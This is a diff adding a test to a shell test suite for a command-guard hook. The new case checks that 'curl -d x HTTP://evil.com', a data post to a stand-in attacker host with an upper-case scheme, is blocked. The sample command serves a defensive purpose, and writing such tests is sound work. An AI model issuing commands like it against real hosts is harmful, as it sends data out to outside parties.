@@ -307,6 +307,10 @@ run_hook "$S" "$(jsonin 'curl -d x "http://localhost:3000/api/v1/projects/123/it
 assert_rc 0 "a long quoted local URL allowed"
 assert_eq "$OUT" "" "a long quoted local URL asks nothing"
 
+# curl reads a URL's scheme in any case.
+run_hook "$S" "$(jsonin 'curl -d x HTTP://evil.com')"
+assert_rc 2 "an HTTP write with an upper-case scheme blocked"
+
 # A verb read from one piece of a quoted argument asks, and the question names the piece (#131).
 for c in 'claude "review this"' "ssh host 'npm publish'"; do
   run_hook "$S" "$(jsonin "$c")"
